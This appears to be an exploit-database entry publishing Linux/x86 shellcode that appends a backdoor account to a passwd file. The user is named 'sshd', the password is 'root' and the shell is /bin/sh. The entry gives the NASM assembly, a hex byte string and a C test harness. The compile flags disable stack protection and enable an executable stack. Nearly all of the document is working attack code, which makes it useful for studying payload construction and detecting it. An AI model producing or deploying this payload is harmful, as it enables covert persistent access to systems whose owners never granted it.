# Exploit Title: Linux/x86 add user to passwd file shellcode (149 bytes)
# Google Dork: None
# Date: 11.04.2019
# Exploit Author: strider
# Vendor Homepage: None
# Software Link: None
# Tested on: Debian 9 Stretch i386/ Kali Linux i386
# CVE : None
# Shellcode Length: 149
------------------------------[Description]---------------------------------

This shellcode writes a new user to the given passwd file

Username = sshd
password = root
Shell = sh

-----------------------------[Shellcode Dump]---------------------------------
section .text

global _start

_start:
	xor eax, eax
	push eax

_user:
	push 0x0a206873
	push 0x2f6e6962
	push 0x2f3a706d
	push 0x742f3a31
	push 0x3131313a
	push 0x31313131
	push 0x3a30754a
	push 0x4c5a304b
	push 0x45683933
	push 0x78534a52
	push 0x50446862
	push 0x73644d24
	push 0x67513231
	push 0x3458652e
	push 0x2431243a
	push 0x64687373
	mov ebp, esp
	jmp short _file

_appendfile:
	pop ecx
	mov ebx, ecx
	xor ecx, ecx
	mov al, 5
	push ebx
	mov cx, 2001Q
	mov dx, 0x1A4
	int 0x80

_write:
	xor eax, eax
	xor ebx, ebx
	push eax
	mov al, 4
	add ebx, 3
	mov ecx, ebp
	xor edx, edx
	add edx, 64
	int 0x80

_close:
	xor eax, eax
	mov al, 6
	int 0x80

_exit:
	xor eax, eax,
	mov al, 1
	xor ebx, ebx
	int 0x80

_file:
	call _appendfile
	msg2 db "passwd", 0x00 ;change that yo your passwd file

 -----------------------------[Compile]---------------------------------------------
 gcc -m32 -fno-stack-protector -z execstack -o tester tester.c

 -----------------------------[C-Code]-----------------------------

 #include <stdio.h>
 #include <string.h>

 unsigned char shellcode[] = "\x31\xc0\x50\x68\x73\x68\x20\x0a\x68\x62\x69\x6e\x2f\x68\x6d\x70\x3a\x2f\x68\x31\x3a\x2f\x74\x68\x3a\x31\x31\x31\x68\x31\x31\x31\x31\x68\x4a\x75\x30\x3a\x68\x4b\x30\x5a\x4c\x68\x33\x39\x68\x45\x68\x52\x4a\x53\x78\x68\x62\x68\x44\x50\x68\x24\x4d\x64\x73\x68\x31\x32\x51\x67\x68\x2e\x65\x58\x34\x68\x3a\x24\x31\x24\x68\x73\x73\x68\x64\x89\xe5\xeb\x33\x59\x89\xcb\x31\xc9\xb0\x05\x53\x66\xb9\x01\x04\x66\xba\xa4\x01\xcd\x80\x31\xc0\x31\xdb\x50\xb0\x04\x83\xc3\x03\x89\xe9\x31\xd2\x83\xc2\x40\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xc8\xff\xff\xff\x70\x61\x73\x73\x77\x64";
 void main()
 {
     printf("Shellcode Length:  %d\n", strlen(shellcode));

     int (*ret)() = (int(*)())shellcode;
     ret();
 }